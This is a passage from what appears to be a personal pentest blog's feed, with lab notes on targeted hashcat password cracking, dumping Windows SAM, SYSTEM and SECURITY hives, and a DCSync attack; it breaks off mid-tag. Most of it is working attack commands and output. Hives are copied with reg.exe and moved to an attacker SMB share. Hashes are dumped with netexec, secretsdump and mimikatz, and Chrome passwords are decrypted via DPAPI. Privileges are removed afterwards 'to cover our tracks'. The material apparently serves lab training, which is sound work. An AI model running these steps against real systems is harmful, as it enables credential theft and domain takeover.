&#x27;[A-Z]+[a-z]+&#x27; | sort -u &gt; 12ormore.txt</span><br></pre></td></tr></table></figure><ul><li><code>grep -E &#39;^.&#123;12,&#125;$&#39;</code> finds all lines with 12 or more characters.</li><li><code>grep -E &#39;[A-Z]+[a-z]+&#39;</code> ensures there’s at least one uppercase letter followed by a lowercase, a common pattern for capitalization.</li></ul><p>This filtering step is crucial for reducing the noise</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ wc -l 12ormore.txt</span><br><span class="line">190239 12ormore.txt</span><br></pre></td></tr></table></figure><p>We are now left with a final list of over 190,000 strong candidates that are much more likely to be correct. Let’s peek at the first few lines to ensure they look right.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ head -n 3 12ormore.txt</span><br><span class="line">Alex1998!@#$</span><br><span class="line">Alex1998!@#$</span><br><span class="line">Alex1998!@#$</span><br></pre></td></tr></table></figure><h3 id="Cracking-the-Hash"><a href="#Cracking-the-Hash" class="headerlink" title="Cracking the Hash"></a>Cracking the Hash</h3><p>This is the moment of truth. We will now use our final, filtered wordlist (<code>12ormore.txt</code>) against the target hash.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$hashcat -m 0 97268a8ae45ac7d15c3cea4ce6ea550b 12ormore.txt</span><br></pre></td></tr></table></figure><p><strong>Result:</strong><br>Once <code>hashcat</code> finishes, its status will show <code>Cracked</code>. To view the plaintext password you just discovered, use the <code>--show</code> flag.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hashcat -m 0 97268a8ae45ac7d15c3cea4ce6ea550b --show 97268a8ae45ac7d15c3cea4ce6ea550b:Ba******!</span><br></pre></td></tr></table></figure><p>(full doc:<a href="https://hashcat.net/wiki/doku.php?id=rule_based_attack">https://hashcat.net/wiki/doku.php?id=rule_based_attack</a>)</p><table><thead><tr><th><strong>Function</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><code>:</code></td><td>Do nothing</td></tr><tr><td><code>l</code></td><td>Lowercase all letters</td></tr><tr><td><code>u</code></td><td>Uppercase all letters</td></tr><tr><td><code>c</code></td><td>Capitalize the first letter and lowercase others</td></tr><tr><td><code>sXY</code> (leet)</td><td>Replace all instances of X with Y</td></tr><tr><td><code>$!</code></td><td>Add the exclamation character at the end</td></tr><tr><td>$0, $9</td><td>appends numbers</td></tr><tr><td>$1$9$9$8</td><td>translates to 1998</td></tr><tr><td><code>t</code></td><td>Toggle the case of all characters in word p@ssW0rd-&gt;P@SSw0RD</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> --- SECTION 3: Leetspeak (Character Substitution) --- </span><br><span class="line"> Creates passwords like: M@ri@1998!, B@seb@ll2025# # Very effective for corporate environments trying to enforce &quot;complex&quot; passwords.</span><br><span class="line">c s a @ $1$9$9$8$! </span><br><span class="line">c s e 3 $1$9$9$8$! c s i 1 $1$9$9$8$! c s o 0 $1$9$9$8$!</span><br><span class="line">c s a @ $2$0$2$5$# </span><br><span class="line">c s s $ $2$0$2$5$@ # Combined leetspeak c s a @ s i 1 $1$9$9$8$! c s a @ s o 0 $9$8$#</span><br></pre></td></tr></table></figure><p>so when writing the rules, they  would look like this:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Creates passwords like: Baseball1998!,</span><br><span class="line">c $1$9$9$8$@ -&gt; Nexura2025@</span><br><span class="line">c $!$1$9$9$8 -&gt; Abdo!1998</span><br><span class="line">c $1$9$9$8$! -&gt; Abdo1998!</span><br></pre></td></tr></table></figure><p>apply the rule to the  wordlist:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hashcat --force password.list -r custom.rule --stdout | sort -u &gt; mut_password.list</span><br></pre></td></tr></table></figure><p>hmm, lets see how many words we have</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ wc -l mut_password.list </span><br><span class="line">231238 mut_password.list</span><br></pre></td></tr></table></figure><p>now lets further customize it for our password policy since there maybe huge amount of junk that wouldn’t work, by grepping for words with 12 or more characters:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ cat mut_password.list | grep -E &#x27;^.&#123;12,&#125;$&#x27; | grep -E &#x27;[A-Z]+[a-z]+&#x27; | sort -u &gt; 12ormore.txt</span><br><span class="line"></span><br><span class="line">$ wc -l 12ormore.txt </span><br><span class="line">190239 12ormore.txt</span><br></pre></td></tr></table></figure><p>okay but how does each word look like?</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ head -n 50 12ormore.txt </span><br><span class="line">&#x27;#&#x27;&#x27;#&#x27;$Alex98!</span><br><span class="line">&#x27;#&#x27;$&#x27;#&#x27;Alex98!</span><br><span class="line">$&#x27;#&#x27;&#x27;#&#x27;Alex98!</span><br><span class="line">&#x27;#&#x27;&#x27;#&#x27;$Bella98!</span><br></pre></td></tr></table></figure><p>i kept it this way as mark may have set the symbols firstly, but the symbols in the beginning could be removed  and replaced with uppercase in the beginning with: <code>grep -E &#39;^[A-Z]&#39;</code></p><p>now lets put it all to the test:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hashcat  -m 0 97268a8ae45ac7d15c3cea4ce6ea550b 12ormore.txt </span><br><span class="line">hashcat (v6.2.6) starting</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hashcat  -m 0 97268a8ae45ac7d15c3cea4ce6ea550b 12ormore.txt  --show</span><br><span class="line">97268a8ae45ac7d15c3cea4ce6ea550b:Ba******!</span><br></pre></td></tr></table></figure><p><strong>Success!</strong> The output above is redacted to let you discover the answer on your own. On your screen, you should see the full, cracked password. You’ll notice it perfectly matches the intelligence we gathered—a keyword from the victim’s life, combined with numbers and a symbol to meet the corporate policy</p><h3 id="Key-Takeaways"><a href="#Key-Takeaways" class="headerlink" title="Key Takeaways"></a>Key Takeaways</h3><ul><li><strong>OSINT is Power:</strong> Good intelligence gathering is the most critical step in a targeted attack.</li><li><strong>Humans are Predictable:</strong> Users often follow simple patterns to meet “complex” password policies, which we can replicate with <code>hashcat</code> rules.</li><li><strong>Filtering is Efficiency:</strong> A broad ruleset creates many possibilities, but filtering for the known policy requirements is what makes the attack fast and effective.</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> hashcat </tag>
            
            <tag> cupp </tag>
            
            <tag> wordlists </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dumping SAM Account Hashes</title>
      <link href="/2025/04/12/Dumpin%20Registery%20Hives/"/>
      <url>/2025/04/12/Dumpin%20Registery%20Hives/</url>
      
        <content type="html"><![CDATA[<p><img src="/../images/Secd1.png" alt="alt text"></p><h1 id="Overview"><a href="#Overview" class="headerlink" title="_Overview"></a>_Overview</h1><p>With administrative access to a Windows system, one of the most effective post-exploitation techniques is to dump the Security Account Manager (SAM) database. The SAM stores hashed credentials for local user accounts and is a valuable target for attackers aiming to escalate privileges or move laterally within a network.</p><p>By extracting SAM, SYSTEM, and SECURITY hives from the target machine, we can transfer them to our attack host and perform offline hash cracking using tools such as Hashcat or John the Ripper, or even perform Pass-the-Hash attacks.</p><h2 id="Windows-Registery-Hives"><a href="#Windows-Registery-Hives" class="headerlink" title="Windows Registery Hives"></a>Windows Registery Hives</h2><p>There are three registry hives we can copy if we have<code> local administrative</code> access to a target system, each serving a specific purpose when it comes to dumping and cracking password hashes. A brief description of each is provided in the table below:</p><table><thead><tr><th>Registry Hive</th><th>Description</th></tr></thead><tbody><tr><td><code>HKLM\SAM</code></td><td>Contains password hashes for local user accounts. These hashes can be extracted and cracked to reveal plaintext passwords.</td></tr><tr><td><code>HKLM\SYSTEM</code></td><td>Stores the system boot key, which is used to encrypt the SAM database. This key is required to decrypt the hashes.</td></tr><tr><td><code>HKLM\SECURITY</code></td><td>Contains sensitive information used by the Local Security Authority (LSA), including cached domain credentials (DCC2), cleartext passwords, DPAPI keys, and more.</td></tr><tr><td></td><td></td></tr></tbody></table><h1 id="hash-differences"><a href="#hash-differences" class="headerlink" title="hash differences"></a>hash differences</h1><table><thead><tr><th>Feature</th><th>SAM (SAM + SYSTEM)</th><th>LSA Secrets (SECURITY)</th></tr></thead><tbody><tr><td>Focus</td><td>Local account password hashes</td><td>Cached credentials &amp; secrets (domain creds, etc.)</td></tr><tr><td>Format</td><td>NTLM hashes</td><td>Plaintext or encrypted strings</td></tr><tr><td>Common Use</td><td>Crack local user passwords</td><td></td></tr></tbody></table><h1 id="cheatsheet"><a href="#cheatsheet" class="headerlink" title="cheatsheet"></a>cheatsheet</h1><p>  <code>reg.exe</code> to save copies of the registry hives:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; reg.exe save hklm\sam C:\sam.save</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt; reg.exe save hklm\system C:\system.save</span><br><span class="line"></span><br><span class="line">&gt; reg.exe save hklm\security C:\security.save</span><br></pre></td></tr></table></figure><p> copy to VM:</p><ul><li>create a smb share on attacking vm</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ impacket-smbserver -smb2support compdata /home/demise/mountshare</span><br></pre></td></tr></table></figure><ul><li>move hives to share:</li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">move</span> <span class="title">sam.save</span> \\10.10.15.16\<span class="title">compdata</span></span></span><br><span class="line"><span class="function">      </span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> <span class="title">move</span> <span class="title">security.save</span> \\10.10.15.16\<span class="title">compdata</span></span></span><br><span class="line"><span class="function">       </span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> <span class="title">move</span> <span class="title">system.save</span> \\10.10.15.16\<span class="title">compdata</span></span></span><br><span class="line"><span class="function">     </span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ls</span><br><span class="line"></span><br><span class="line">sam.save  security.save  system.save</span><br></pre></td></tr></table></figure><h3 id="dump-LSA-hashes-remotely"><a href="#dump-LSA-hashes-remotely" class="headerlink" title="dump LSA  hashes remotely"></a>dump LSA  hashes remotely</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa</span><br></pre></td></tr></table></figure><h3 id="dump-SAM-hashes-remotely"><a href="#dump-SAM-hashes-remotely" class="headerlink" title="dump SAM  hashes remotely"></a>dump SAM  hashes remotely</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam</span><br></pre></td></tr></table></figure><h3 id="Dump-Locally-with-impacket"><a href="#Dump-Locally-with-impacket" class="headerlink" title="Dump Locally  with impacket"></a>Dump Locally  with impacket</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL</span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure><p>dumping format:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)</span><br></pre></td></tr></table></figure><p>copy  <code>NT </code>hash to a file using nano </p><h4 id="crack-NT-hash-with-hashcat"><a href="#crack-NT-hash-with-hashcat" class="headerlink" title="crack NT hash with hashcat"></a>crack NT hash with hashcat</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hashcat -m 1000 c02478537b9727d391bc80011c2e2321 /usr/share/wordlists/rockyou.txt  -D 1 -O     </span><br></pre></td></tr></table></figure><h3 id="cracking-DCC2-Hash-from-Security-hive"><a href="#cracking-DCC2-Hash-from-Security-hive" class="headerlink" title="cracking DCC2 Hash (from Security hive)"></a>cracking DCC2 Hash (from Security hive)</h3><p>hashed copies of network credential hashes. An example is:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inlanefreight.local/Administrator:$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25</span><br></pre></td></tr></table></figure><p>The Hashcat mode for cracking DCC2 hashes is <code>2100</code>.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hashcat -m 2100 &#x27;$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25&#x27; /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><h4 id="DPAPI-Decryption"><a href="#DPAPI-Decryption" class="headerlink" title="DPAPI Decryption"></a>DPAPI Decryption</h4><p>DPAPI encrypted credentials can be decrypted manually with tools like Impacket’s <a href="https://github.com/fortra/impacket/blob/master/examples/dpapi.py">dpapi</a>, <a href="https://github.com/gentilkiwi/mimikatz">mimikatz</a>, or remotely with <a href="https://github.com/login-securite/DonPAPI">DonPAPI</a>.&#96;</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Public&gt; mimikatz.exe</span><br><span class="line">mimikatz <span class="comment"># dpapi::chrome /in:&quot;C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data&quot; /unprotect</span></span><br><span class="line">&gt; Encrypted Key found <span class="keyword">in</span> local state file</span><br><span class="line">&gt; Encrypted Key seems to be protected by DPAPI</span><br><span class="line"> * <span class="keyword">using</span> CryptUnprotectData API</span><br><span class="line">&gt; AES Key is: efefdb353f36e6a9b7a7552cc421393daf867ac28d544e4f6f157e0a698e343c</span><br><span class="line"></span><br><span class="line">URL     : http://<span class="number">10.10</span>.<span class="number">14.94</span>/ ( http://<span class="number">10.10</span>.<span class="number">14.94</span>/login.html )</span><br><span class="line">Username: bob</span><br><span class="line"> * <span class="keyword">using</span> BCrypt with AES-256-GCM</span><br><span class="line">Password: April2025!</span><br></pre></td></tr></table></figure><p>This tells us how to interpret the output and which hashes we can attempt to crack.</p><h1 id="Methodology"><a href="#Methodology" class="headerlink" title="Methodology"></a>Methodology</h1><p>[] i dog<br><code>SAM</code> +<code> SYSTEM</code> -&gt; hash dump<br><code>SECURITY</code>  -&gt; cached domain hashes<br>                                               |<br>We can back up these hives using the <code>reg.exe</code> utility.</p><h4 id="Using-reg-exe-to-copy-registry-hives"><a href="#Using-reg-exe-to-copy-registry-hives" class="headerlink" title="Using reg.exe to copy registry hives"></a>Using reg.exe to copy registry hives</h4><p>By launching <code>cmd.exe</code> with administrative privileges, we can use <code>reg.exe</code> to save copies of the registry hives. Run the following commands:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\WINDOWS\system32&gt; reg.exe save hklm\sam C:\sam.save</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt; reg.exe save hklm\system C:\system.save</span><br><span class="line"></span><br><span class="line">&gt; reg.exe save hklm\security C:\security.save</span><br></pre></td></tr></table></figure><h1 id="copying-to-vm"><a href="#copying-to-vm" class="headerlink" title="copying to vm"></a>copying to vm</h1><p>To create the share, we simply run <code>smbserver.py -smb2support</code>, specify a name for the share (e.g., <code>CompData</code>), and point to the local directory on our attack host where the hive copies will be stored (e.g., <code>/home/ltnbob/Documents</code></p><h3 id="DUMPING-HASHES"><a href="#DUMPING-HASHES" class="headerlink" title="DUMPING HASHES"></a>DUMPING HASHES</h3><p>the first step <code>secretsdump</code> performs is retrieving the <code>system bootkey</code> before proceeding to dump the <code>local SAM hashes</code>. This is necessary because the bootkey is used to encrypt and decrypt the SAM database. Without it, the hashes cannot be decrypted — which is why having copies of the relevant registry hives, as discussed earlier, is crucial.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Dumping local SAM hashes (uid:rid:lmhash:nthash)</span><br></pre></td></tr></table></figure><h1 id="DCC2-HASH"><a href="#DCC2-HASH" class="headerlink" title="DCC2 HASH"></a>DCC2 HASH</h1><p>This type of hash is much more difficult to crack than an NT hash, as it uses PBKDF2. Additionally, it cannot be used for lateral movement with techniques like Pass-the-Hash (which we will cover later). The Hashcat mode for cracking DCC2 hashes is <code>2100</code>.<br>DCC2 hashes is approximately <code>800 times slower</code> to crack</p><h1 id="DPAPI"><a href="#DPAPI" class="headerlink" title="DPAPI"></a>DPAPI</h1><p>DPAPI encrypted credentials can be decrypted manually with tools like Impacket’s <a href="https://github.com/fortra/impacket/blob/master/examples/dpapi.py">dpapi</a>, <a href="https://github.com/gentilkiwi/mimikatz">mimikatz</a>, or remotely with <a href="https://github.com/login-securite/DonPAPI">DonPAPI</a>.</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Public&gt; mimikatz.exe</span><br><span class="line">mimikatz <span class="comment"># dpapi::chrome /in:&quot;C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data&quot; /unprotect</span></span><br><span class="line">&gt; Encrypted Key found <span class="keyword">in</span> local state file</span><br><span class="line">&gt; Encrypted Key seems to be protected by DPAPI</span><br><span class="line"> * <span class="keyword">using</span> CryptUnprotectData API</span><br><span class="line">&gt; AES Key is: efefdb353f36e6a9b7a7552cc421393daf867ac28d544e4f6f157e0a698e343c</span><br><span class="line"></span><br><span class="line">URL     : http://<span class="number">10.10</span>.<span class="number">14.94</span>/ ( http://<span class="number">10.10</span>.<span class="number">14.94</span>/login.html )</span><br><span class="line">Username: bob</span><br><span class="line"> * <span class="keyword">using</span> BCrypt with AES-256-GCM</span><br><span class="line">Password: April2025!</span><br></pre></td></tr></table></figure><h2 id="Remote-dumping-LSA-secrets-considerations"><a href="#Remote-dumping-LSA-secrets-considerations" class="headerlink" title="Remote dumping &amp; LSA secrets considerations"></a>Remote dumping &amp; LSA secrets considerations</h2><p>With access to credentials that have <code>local administrator privileges</code>, it is also possible to target LSA secrets over the network. This may allow us to extract credentials from running services, scheduled tasks, or applications that store passwords using LSA secrets.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">magdy3660@htb[/htb]$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa</span><br><span class="line">[+] Dumping LSA secrets</span><br><span class="line">SMB         10.129.42.198   445    WS01     WS01\worker:Hello123</span><br><span class="line">SMB         10.129.42.198   445    WS01      dpapi_machinekey:0xc03a4a&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> privEsc </tag>
            
            <tag> windows </tag>
            
            <tag> registry </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>On  Performing a DCSync Attack</title>
      <link href="/2025/03/26/dcsync/"/>
      <url>/2025/03/26/dcsync/</url>
      
        <content type="html"><![CDATA[<p><img src="/../images/dcysnc23.png" alt="alt text"></p><h1 id="Overview"><a href="#Overview" class="headerlink" title="_Overview"></a>_Overview</h1><p>DCSync is a technique for stealing the Active Directory password database by using the built-in Directory Replication Service Remote Protocol, which is used by Domain Controllers to replicate domain data. This allows an attacker to mimic a Domain Controller to retrieve user NTLM password hashes.</p><span id="more"></span> <p>The core of the attack involves exploiting the DS-Replication-Get-Changes-All extended right to prompt a Domain Controller to replicate password data. This specific Active Directory permission grants access to replicate sensitive, secret information across the domain.</p><p><img src="/../images/REPACE.png" alt="alt text"></p><hr><h3 id="Checking-user-Groups-SID-ACLs"><a href="#Checking-user-Groups-SID-ACLs" class="headerlink" title="Checking user Groups, SID, ACLs"></a>Checking user Groups, SID, ACLs</h3><p>PowerView can be used to confirm that this standard user does indeed have the necessary permissions assigned to their account.</p><p>We first get the user’s SID in the above command and then check all ACLs set on the domain object (<code>&quot;DC=inlanefreight,DC=local&quot;</code>) using <a href="https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainObjectAcl/">Get-ObjectAcl</a> to get the ACLs associated with the object. Here we search specifically for replication rights and check if our user <code>adunn</code> (denoted in the below command as <code>$sid</code>) possesses these rights. The command confirms that the user does indeed have the rights.<br>Checking for Replication–Get ACE</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$sid = &quot;&#123;sid-here&#125;&quot;</span><br><span class="line"></span><br><span class="line">PS&gt; Get-ObjectAcl &quot;DC=inlanefreight,DC=local&quot; -ResolveGUIDs | ? &#123; ($_.ObjectAceType -match &#x27;Replication-Get&#x27;)&#125; | ?&#123;$_.SecurityIdentifier -match $sid&#125; |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">AceQualifier          : AccessAllowed</span><br><span class="line">ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">ActiveDirectoryRights : ExtendedRight</span><br><span class="line">SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164</span><br><span class="line">ObjectAceType         : DS-Replication-Get-Changes-In-Filtered-Set</span><br><span class="line"></span><br><span class="line">AceQualifier          : AccessAllowed</span><br><span class="line">ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">ActiveDirectoryRights : ExtendedRight</span><br><span class="line">SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164</span><br><span class="line">ObjectAceType         : DS-Replication-Get-Changes</span><br><span class="line"></span><br><span class="line">AceQualifier          : AccessAllowed</span><br><span class="line">ObjectDN</span><br></pre></td></tr></table></figure><p>If we had certain rights over the user (such as <a href="https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#writedacl">WriteDacl</a>), we could also add this privilege to a user under our control, execute the DCSync attack, and then remove the privileges to attempt to cover our tracks. DCSync replication can be performed using tools such as Mimikatz, Invoke-DCSync, and Impacket’s secretsdump.py. Let’s see a few quick examples.</p><h3 id="exploit-replication-ACE-to-perform-DCsync"><a href="#exploit-replication-ACE-to-perform-DCsync" class="headerlink" title="exploit  replication ACE to perform DCsync"></a>exploit  replication ACE to perform DCsync</h3><h4 id="impacket-secretsdump-py"><a href="#impacket-secretsdump-py" class="headerlink" title="(impacket) secretsdump.py"></a>(impacket) secretsdump.py</h4><p>Running the tool as below will write all hashes to files with the prefix <code>inlanefreight_hashes</code>. The <code>-just-dc</code> flag tells the tool to extract NTLM hashes and Kerberos keys from the NTDS file.</p><p> Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">linux-attack$ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 </span><br><span class="line"></span><br><span class="line">pass:</span><br><span class="line"></span><br><span class="line">[*] Target system bootKey: 0x0e79d2e5d9bad2639da4ef244b30fda5</span><br><span class="line">[*] Searching for NTDS.dit</span><br><span class="line">[*] Registry says NTDS.dit is at C:\Windows\NTDS\ntds.dit. Calling vssadmin to get a copy. This might take some time</span><br><span class="line">[*] Using smbexec method for remote execution</span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Searching for pekList, be patient</span><br><span class="line">[*] PEK # 0 found and decrypted: a9707d46478ab8b3ea22d8526ba15aa6</span><br><span class="line">[*] Reading and decrypting hashes from \\172.16.5.5\ADMIN$\Temp\HOLJALFD.tmp </span><br><span class="line">inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::</span><br><span class="line">guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">lab_adm:1001:aad3b435b51404eeaad3b435b51404ee:663715a1a8b957e8e9943cc98ea451b6:::</span><br><span class="line">ACADEMY-EA-DC01$:1002:aad3b435b51404eeaad3b435b51404ee:13673b5b66f699e81b2ebcb63ebdccfb:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::</span><br><span class="line">ACADEMY-EA-MS01$:1107:aad3b435b51404eeaad3b435b51404ee:06c77ee55364bd52559c0db9b1176f7a:::</span><br><span class="line">ACADEMY-EA-WEB01$:1108:aad3b435b51404eeaad3b435b51404ee:1c7e2801ca48d0a5e3d5baf9e68367ac:::</span><br><span class="line">inlanefreight.local\htb-student:1111:aad3b435b51404eeaad3b435b51404ee:2487a01dd672b583415cb52217824bb5:::</span><br><span class="line">inlanefreight.local\avazquez:1112:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::</span><br></pre></td></tr></table></figure><p>We can use the <code>-just-dc-ntlm</code> flag if we only want NTLM hashes or specify <code>-just-dc-user &lt;USERNAME&gt;</code> to only extract data for a specific user. Other useful options include <code>-pwd-last-set</code> to see when each account’s password was last changed and <code>-history</code> if we want to dump password history, which may be helpful for offline password cracking or as supplemental data on domain password strength metrics for our client. The <code>-user-status</code> is another helpful flag to check and see if a user is disabled. We can dump the NTDS data with this flag and then filter out disabled users when providing our client with password cracking statistics to ensure that data such as:</p><ul><li>Number and % of passwords cracked</li><li>top 10 passwords</li><li>Password length metrics</li><li>Password re-use</li></ul><h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">runas /netonly /user:domain&lt;ilfreight\&#123;high-priv-user&#125;tpetty powershell &#123;requires pass&#125;</span><br><span class="line"></span><br><span class="line">./mimikatz.exe</span><br><span class="line"></span><br><span class="line"># lsadump::dcsync /domain:&#123;&#125; /user:&#123;domain\targetuser&#125; </span><br></pre></td></tr></table></figure><h4 id="Viewing-an-Account-with-Reversible-Encryption-Password-Storage-Set"><a 